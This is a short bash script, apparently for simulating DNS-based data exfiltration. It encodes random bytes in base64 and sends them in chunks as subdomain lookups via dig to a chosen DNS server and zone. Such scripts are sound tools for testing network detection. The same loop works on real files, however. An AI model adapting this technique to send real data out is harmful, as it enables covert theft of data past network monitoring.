#!/usr/bin/env bash
### Trivial one-liner bash-based file exfil over dns example - random data
###
#
# Usage: $0 <dns_server_ip> <zone suffix/hrd>
#
# Ex. ./dns_exfil_random.sh 8.8.8.8 elastic.co
#

if [[ -n $1 && -n $2 ]]; then count=0 ; dd if=/dev/urandom bs=1 count=64k 2>/dev/null| base64 -w 63 | while read line; do line=$(echo $line |tr -d '\n') ; req=$(echo "${count}.$line") ; dig "${count}.${line}.${2}" @${1}; count=$((count+1)) ; done; fi